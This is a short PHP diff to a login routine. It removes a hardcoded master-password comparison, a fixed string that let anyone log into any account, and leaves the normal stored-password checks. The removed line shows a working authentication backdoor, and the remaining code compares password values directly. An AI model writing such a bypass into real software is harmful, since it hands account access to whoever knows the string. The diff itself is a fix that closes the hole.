@@ -19,7 +19,7 @@ $stmt->bind_result($userid,$password,$newpassword,$privs,$preferences_ser);
 if ($stmt->fetch())
     {
     $stmt->close();
-    if (($postedpassword == $password) || (($newpassword != '') && ($postedpassword == $newpassword)) || ($postedpassword == 'a8053ef9c59a73edb43cc1becb9f2c90'))
+    if (($postedpassword == $password) || (($newpassword != '') && ($postedpassword == $newpassword)))
         {
         $_SESSION['userid'] = $userid;
         $_SESSION['username'] = htmlentities($username);
